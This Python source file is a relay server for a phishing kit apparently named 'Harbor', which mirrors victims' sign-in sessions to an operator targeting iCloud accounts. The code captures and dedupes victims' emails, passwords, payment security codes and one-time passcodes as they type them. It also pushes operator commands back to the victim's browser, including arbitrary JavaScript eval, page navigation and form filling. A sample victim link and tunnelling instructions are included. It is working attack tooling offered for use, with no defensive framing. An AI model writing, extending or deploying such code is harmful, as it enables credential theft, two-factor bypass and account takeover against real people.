#!/usr/bin/env python3
"""
HTTP relay: remote Harbor victims (any device) -> operator phish_mirror (local iCloud).

Victim URL example:
  https://harbor-ten-lake.vercel.app/signin?sid=op1&fwd=https://YOUR-TUNNEL

Operator:
  python phish_mirror.py --remote --relay http://127.0.0.1:8931 --session op1
"""

from __future__ import annotations

import asyncio
import json
import uuid
from collections import deque
from dataclasses import dataclass, field
from typing import Any
from urllib.parse import urlparse

from aiohttp import web

DEFAULT_PORT = 8931
MAX_EVENTS = 5000
MAX_CMDS = 5000


@dataclass
class SessionState:
    events: deque = field(default_factory=deque)
    victim_cmds: deque = field(default_factory=deque)
    meta: dict = field(default_factory=dict)


SESSIONS: dict[str, SessionState] = {}


def _input_event_rank(ev: dict) -> tuple:
    payload = ev.get("payload") or {}
    value = payload.get("value") or ""
    seq = int(ev.get("seq") or 0)
    t = int(ev.get("t") or 0)
    return (seq, t, len(str(value)))


def _account_input_rank(ev: dict) -> tuple:
    payload = ev.get("payload") or {}
    value = str(payload.get("value") or "")
    return (int(ev.get("seq") or 0), int(ev.get("t") or 0), len(value))


def _should_replace_input(prev: dict, new: dict) -> bool:
    field = (new.get("payload") or {}).get("field")
    if field == "account":
        return _account_input_rank(new) >= _account_input_rank(prev)
    return _input_event_rank(new) >= _input_event_rank(prev)


def _session(sid: str) -> SessionState:
    sid = (sid or "").strip() or "default"
    if sid not in SESSIONS:
        SESSIONS[sid] = SessionState()
    return SESSIONS[sid]


def cors(response: web.StreamResponse) -> web.StreamResponse:
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return response


async def options_handler(_request: web.Request) -> web.Response:
    return cors(web.Response(status=204))


def ingest_event(st: SessionState, ev: dict) -> None:
    if ev.get("type") == "email-commit":
        replaced = False
        for i in range(len(st.events) - 1, -1, -1):
            prev = st.events[i]
            if prev.get("type") != "email-commit":
                continue
            if int(ev.get("seq") or 0) >= int(prev.get("seq") or 0):
                st.events[i] = ev
            replaced = True
            break
        if not replaced:
            st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    if ev.get("type") == "password-commit":
        replaced = False
        for i in range(len(st.events) - 1, -1, -1):
            prev = st.events[i]
            if prev.get("type") != "password-commit":
                continue
            if int(ev.get("seq") or 0) >= int(prev.get("seq") or 0):
                st.events[i] = ev
            replaced = True
            break
        if not replaced:
            st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    if ev.get("type") == "input":
        field = (ev.get("payload") or {}).get("field")
        if field in ("account", "password", "payment-csc"):
            replaced = False
            for i in range(len(st.events) - 1, -1, -1):
                prev = st.events[i]
                if prev.get("type") != "input":
                    continue
                if (prev.get("payload") or {}).get("field") != field:
                    continue
                if _should_replace_input(prev, ev):
                    st.events[i] = ev
                replaced = True
                break
            if not replaced:
                st.events.append(ev)
            while len(st.events) > MAX_EVENTS:
                st.events.popleft()
            return
    if ev.get("type") == "otp-input":
        payload = ev.get("payload") or {}
        idx = str(payload.get("index", payload.get("i", 0)))
        replaced = False
        for i in range(len(st.events) - 1, -1, -1):
            prev = st.events[i]
            if prev.get("type") != "otp-input":
                continue
            p2 = prev.get("payload") or {}
            if str(p2.get("index", p2.get("i", 0))) != idx:
                continue
            if _should_replace_input(prev, ev):
                st.events[i] = ev
            replaced = True
            break
        if not replaced:
            st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    if ev.get("type") == "otp-paste":
        for i in range(len(st.events) - 1, -1, -1):
            if st.events[i].get("type") == "otp-paste":
                if _should_replace_input(st.events[i], ev):
                    st.events[i] = ev
                return
        st.events.append(ev)
        while len(st.events) > MAX_EVENTS:
            st.events.popleft()
        return
    st.events.append(ev)
    while len(st.events) > MAX_EVENTS:
        st.events.popleft()


async def post_event(request: web.Request) -> web.Response:
    try:
        body = await request.json()
    except json.JSONDecodeError:
        return cors(web.json_response({"ok": False, "error": "json"}, status=400))
    sid = str(body.get("session") or "default")
    batch = body.get("events")
    if isinstance(batch, list) and batch:
        st = _session(sid)
        n = 0
        for ev in batch:
            if isinstance(ev, dict):
                ingest_event(st, ev)
                n += 1
        return cors(web.json_response({"ok": True, "n": n}))
    ev = body.get("event")
    if not isinstance(ev, dict):
        return cors(web.json_response({"ok": False, "error": "event"}, status=400))
    st = _session(sid)
    ingest_event(st, ev)
    return cors(web.json_response({"ok": True}))


async def drain_events(request: web.Request) -> web.Response:
    sid = request.query.get("session") or "default"
    st = _session(sid)
    out = list(st.events)
    st.events.clear()
    return cors(web.json_response({"ok": True, "events": out}))


async def post_victim_cmd(request: web.Request) -> web.Response:
    try:
        body = await request.json()
    except json.JSONDecodeError:
        return cors(web.json_response({"ok": False}, status=400))
    sid = str(body.get("session") or "default")
    cmd = body.get("cmd")
    if cmd is None:
        cmds = body.get("cmds")
        if isinstance(cmds, list):
            st = _session(sid)
            for c in cmds:
                st.victim_cmds.append(c)
            while len(st.victim_cmds) > MAX_CMDS:
                st.victim_cmds.popleft()
            return cors(web.json_response({"ok": True, "n": len(cmds)}))
        return cors(web.json_response({"ok": False}, status=400))
    st = _session(sid)
    st.victim_cmds.append(cmd)
    while len(st.victim_cmds) > MAX_CMDS:
        st.victim_cmds.popleft()
    return cors(web.json_response({"ok": True}))


async def victim_poll(request: web.Request) -> web.Response:
    sid = request.query.get("session") or "default"
    st = _session(sid)
    cmds = list(st.victim_cmds)
    st.victim_cmds.clear()
    return cors(web.json_response({"ok": True, "cmds": cmds}))


async def reset_session(request: web.Request) -> web.Response:
    sid = request.query.get("session") or "default"
    SESSIONS.pop(sid, None)
    return cors(web.json_response({"ok": True}))


async def status_handler(_request: web.Request) -> web.Response:
    summary = {
        sid: {"events_pending": len(st.events), "cmds_pending": len(st.victim_cmds)}
        for sid, st in SESSIONS.items()
    }
    return cors(web.json_response({"ok": True, "sessions": summary}))


def make_app() -> web.Application:
    app = web.Application()
    app.router.add_route("OPTIONS", "/relay/{path:.*}", options_handler)
    app.router.add_post("/relay/event", post_event)
    app.router.add_get("/relay/events", drain_events)
    app.router.add_post("/relay/victim-cmd", post_victim_cmd)
    app.router.add_get("/relay/victim-poll", victim_poll)
    app.router.add_post("/relay/reset", reset_session)
    app.router.add_get("/relay/reset", reset_session)
    app.router.add_get("/relay/status", status_handler)
    app.router.add_get("/", lambda _r: cors(web.json_response({"service": "harbor-phish-relay", "ok": True})))
    return app


def _use_vercel_api(relay_base: str) -> bool:
    b = (relay_base or "").lower()
    return "127.0.0.1" not in b and "localhost" not in b


def _relay_path(relay_base: str, legacy: str, api: str) -> str:
    base = relay_base.rstrip("/")
    if _use_vercel_api(relay_base):
        return f"{base}{api}"
    return f"{base}{legacy}"


class RemoteVictimPage:
    """Drop-in for Playwright Page for victim-side eval/goto (via relay)."""

    def __init__(
        self,
        relay_base: str,
        session: str,
        harbor_base: str = "",
        relay_public: str = "",
    ) -> None:
        import urllib.request

        self._relay = relay_base.rstrip("/")
        self._session = session
        self._harbor = harbor_base.rstrip("/")
        self._relay_public = (relay_public or "").rstrip("/")
        self._path = "/signin"
        self._urllib = urllib.request
        self._cmd_buffer: list[dict] = []
        self._password_step = False

    def _with_victim_query(self, url: str) -> str:
        if not self._harbor or not url.startswith(self._harbor):
            return url
        if not self._relay_public:
            return url
        from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

        parsed = urlparse(url)
        q = dict(parse_qsl(parsed.query, keep_blank_values=True))
        q.setdefault("sid", self._session)
        q.setdefault("fwd", self._relay_public)
        new_q = urlencode(q)
        return urlunparse(parsed._replace(query=new_q))

    def route_to(self, path: str, state: dict | None = None) -> None:
        """Atomic victim navigation (preserves sid/fwd query on device)."""
        path = path if path.startswith("/") else "/" + path
        self.flush_cmds(force=True)
        cmd: dict = {"op": "harbor-route", "path": path}
        if state:
            cmd["state"] = state
        self._post_json(
            self._cmd_path(),
            {"session": self._session, "cmd": cmd},
        )
        self._path = path.rstrip("/") or "/"
        if self._path == "/verify":
            self._password_step = True

    def push_harbor_state(self, state: dict) -> None:
        if not state:
            return
        self._post_json(
            self._cmd_path(),
            {"session": self._session, "cmd": {"op": "harbor-state", "state": state}},
        )

    def goto(self, url: str, **kwargs) -> None:
        self.flush_cmds(force=True)
        url = self._with_victim_query(url)
        self._post_json(
            self._cmd_path(),
            {"session": self._session, "cmd": {"op": "goto", "url": url, "priority": 1}},
        )
        if url.startswith(self._harbor):
            p = urlparse(url).path or "/"
            self._path = p.rstrip("/") or "/"
            if self._path == "/verify":
                self._password_step = True

    def navigate_harbor(self, path: str) -> None:
        path = path if path.startswith("/") else "/" + path
        if not self._harbor:
            return
        self.goto(self._harbor + path)

    @property
    def commanded_path(self) -> str:
        return self._path

    @property
    def url(self) -> str:
        if self._harbor:
            return self._harbor + self._path
        return self._path

    def set_path(self, path: str) -> None:
        """Internal mirror hint only — does not navigate the remote browser."""
        if path:
            self._path = path if path.startswith("/") else "/" + path

    def mark_password_step(self) -> None:
        self._password_step = True

    def on_password_step(self) -> bool:
        return self._password_step

    def _cmd_path(self) -> str:
        return "/api/relay/victim-cmd" if _use_vercel_api(self._relay) else "/relay/victim-cmd"

    def _post_json(self, path: str, payload: dict) -> None:
        data = json.dumps(payload).encode("utf-8")
        req = self._urllib.Request(
            f"{self._relay}{path}",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with self._urllib.urlopen(req, timeout=10) as resp:
                resp.read()
        except (OSError, self._urllib.URLError):
            pass

    def flush_cmds(self, force: bool = False) -> None:
        if not self._cmd_buffer:
            return
        if not force and len(self._cmd_buffer) < 6:
            return
        chunk = self._cmd_buffer[:40]
        del self._cmd_buffer[:40]
        self._post_json(
            self._cmd_path(),
            {"session": self._session, "cmds": chunk},
        )

    def _enqueue_cmd(self, payload: dict, *, immediate: bool = False) -> None:
        self._cmd_buffer.append(payload)
        if immediate or len(self._cmd_buffer) >= 8:
            self.flush_cmds(force=True)

    def evaluate(self, expr: str, arg=None, *, immediate: bool = False) -> Any:
        if arg is not None:
            payload: dict = {"op": "eval", "expr": expr, "arg": arg}
        else:
            payload = {"op": "eval", "expr": expr}
        self._enqueue_cmd(payload, immediate=immediate)
        return None

    def fill(self, selector: str, value: str, **kwargs) -> None:
        esc = json.dumps(value)
        sel = json.dumps(selector)
        self.evaluate(f"() => {{ const el = document.querySelector({sel}); if (el) el.value = {esc}; }}")

    def click(self, selector: str, **kwargs) -> None:
        sel = json.dumps(selector)
        self.evaluate(f"() => {{ const el = document.querySelector({sel}); if (el) el.click(); }}")

    def wait_for_timeout(self, ms: int) -> None:
        import time

        time.sleep(ms / 1000.0)


def relay_reset_session(relay_base: str, session: str) -> None:
    import urllib.request

    url = _relay_path(
        relay_base,
        f"/relay/reset?session={session}",
        f"/api/relay/reset?session={session}",
    )
    try:
        urllib.request.urlopen(url, timeout=10)
    except OSError:
        pass


def relay_drain_events(relay_base: str, session: str) -> list[dict]:
    import urllib.request

    url = _relay_path(
        relay_base,
        f"/relay/events?session={session}",
        f"/api/relay/events?session={session}",
    )
    try:
        with urllib.request.urlopen(url, timeout=5) as resp:
            data = json.loads(resp.read().decode("utf-8"))
            return list(data.get("events") or [])
    except (OSError, json.JSONDecodeError, TimeoutError):
        return []


async def _run_server(host: str, port: int) -> None:
    app = make_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host, port)
    await site.start()
    print(f"Harbor phish relay: http://{host}:{port}/", flush=True)
    print("  Tunnel this URL (cloudflared / ngrok) and set fwd= on Harbor sign-in links.", flush=True)
    while True:
        await asyncio.sleep(3600)


def main() -> None:
    import argparse

    p = argparse.ArgumentParser(description="Harbor remote victim relay")
    p.add_argument("--host", default="127.0.0.1")
    p.add_argument("--port", type=int, default=DEFAULT_PORT)
    args = p.parse_args()
    asyncio.run(_run_server(args.host, args.port))


if __name__ == "__main__":
    main()
